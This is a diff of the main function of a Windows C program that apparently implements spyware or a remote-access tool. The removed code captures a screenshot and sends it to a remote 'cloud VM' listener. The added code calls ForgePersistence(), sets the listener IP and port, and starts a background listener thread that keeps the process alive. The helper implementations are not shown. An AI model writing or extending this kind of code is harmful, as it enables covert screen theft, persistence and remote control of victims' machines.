@@ -154,34 +154,17 @@ int main(int argc, char* argv[]) {
     printf("\n[INFO] Using LISTENER_IP: %s", LISTENER_IP);
     printf("\n[INFO] Using LISTENER_PORT: %d", LISTENER_PORT);
 
-    // Capture screenshot
-    DWORD size = 0;
-    BYTE* buffer = CaptureScreen(&size);
-    if (buffer) {
-        printf("\n[INFO] Screenshot captured successfully (%lu bytes).\n", (unsigned long)size);
+    InitializeWinsock();
+    ForgePersistence();
+    SetCloudConfig(LISTENER_IP, LISTENER_PORT);
+	DetectCaptureSignals(); //Multithreaded. Thread Name : g_signalListenerThread
 
-        // Save to local file
-        if (!Save_Buffer_To_FIle(buffer, size, "screencap.png")) {
-            printf("[ERROR] Failed to save the captured image.\n");
-            free(buffer);
-            exit(1);
-        }
-        printf("[INFO] Screenshot saved to screencap.png\n");
-
-        // Send to cloud VM
-        if (SendScreenShotToCloud(LISTENER_IP, LISTENER_PORT)) {
-            printf("[INFO] Screenshot sent to cloud VM successfully.\n");
-        }
-        else {
-            printf("[ERROR] Failed to send screenshot to cloud VM.\n");
-        }
-
-        free(buffer);
-    }
-    else {
-        printf("[ERROR] Failed to capture screenshot.\n");
-        exit(1);
+    // Keep the application running (listener thread runs in background)
+    printf("\n[INFO] Application running. Press Ctrl+C to exit.\n");
+    while (1) {
+        Sleep(1000);  // Keep process alive
     }
 
+    CleanupWinsock();
     return 0;
 }
